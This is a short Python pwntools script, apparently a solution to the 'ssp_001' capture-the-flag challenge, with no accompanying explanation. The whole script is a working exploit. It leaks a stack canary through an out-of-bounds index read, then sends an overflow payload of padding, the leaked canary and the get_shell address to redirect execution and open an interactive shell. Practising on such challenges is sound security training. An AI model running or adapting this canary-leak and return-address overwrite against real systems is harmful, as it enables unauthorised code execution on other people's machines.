from pwn import *
p = remote("주소", PORT)
e = ELF("./ssp_001")
get_shell = e.symbols["get_shell"]
canary = b''
for i in range(0x83, 0x7f, -1):
    p.sendlineafter("> ", 'P')
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil(" is : ")
    canary += p.recv(2)
payload = b'A' * 0x40
payload += p32(int(canary, 16))
payload += b'A' * 0x8
payload += p32(get_shell)
p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(len(payload) + 1))
p.sendlineafter("Name : ", payload)
p.interactive()